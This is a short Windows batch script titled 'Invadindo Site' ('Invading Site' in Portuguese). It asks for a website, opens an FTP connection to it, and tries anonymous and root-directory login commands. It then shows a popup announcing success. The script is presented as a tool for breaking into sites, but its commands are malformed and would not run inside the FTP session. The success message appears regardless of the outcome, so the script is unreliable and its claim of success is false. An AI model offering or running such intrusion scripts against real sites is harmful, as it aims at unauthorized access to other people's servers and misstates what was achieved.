@echo off
title Invadindo Site
color 4
cls

set /p s=Site[Sem www]:

ftp
open
ftp.%s%
dir
echo.
quote user ftp
quote cwd~root
quote user pass
dir

cls

msg * Projeto bem sucedido.
exit